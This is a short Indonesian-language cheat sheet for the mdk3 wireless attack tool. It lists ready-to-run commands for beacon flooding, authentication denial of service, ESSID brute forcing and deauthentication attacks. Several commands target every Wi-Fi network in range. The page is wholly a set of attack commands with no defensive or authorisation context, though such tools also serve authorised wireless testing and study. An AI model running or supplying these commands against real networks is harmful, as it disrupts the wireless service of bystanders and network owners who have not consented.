# mdk3

`mdk3` adalah tool CLI yang digunakan untuk melakukan berbagai jenis serangan pada jaringan Wi-Fi.

## Penggunaan

Serangan Beacon Flood:

```bash
# beacon flood dengan ssid acak
sudo mdk3 <interface> b

# beacon flood dengan ssid tertentu
sudo mdk3 <interface> b -n <ssid>

# beacon flood dari file yang berisi daftar ssid
sudo mdk3 <interface> b -f <file>

# beacon flood di channel tertentu
sudo mdk3 <interface> b -c <channel>
```

Serangan DoS Autentikasi:

```bash
# serang semua wi-fi di sekitar
sudo mdk3 <interface> a

# serang wi-fi tertentu
sudo mdk3 <interface> a -a <bssid>

# serang menggunakan mac address client yang valid dari database oui
sudo mdk3 <interface> a -a <bssid> -m
```

Serangan Brute Force ESSID:

```bash
# menggunakan ssid spesifik
sudo mdk3 <interface> p -e <ssid>

# menggunakan dictionary attack
sudo mdk3 <interface> p -t <bssid> -f <wordlist>

# menggunakan brute force attack
sudo mdk3 <interface> p -t <bssid> -b <charset>
```

Serangan Deauthentication:

```bash
# deauth semua wi-fi di sekitar
sudo mdk3 <interface> d

# deauth channel tertentu
sudo mdk3 <interface> d -c <channel>

# mode whitelist (deauth semua wi-fi kecuali yang ada di file)
sudo mdk3 <interface> d -w <file>

# mode blacklist (deauth semua wi-fi yang ada di file)
sudo mdk3 <interface> d -b <file>
```
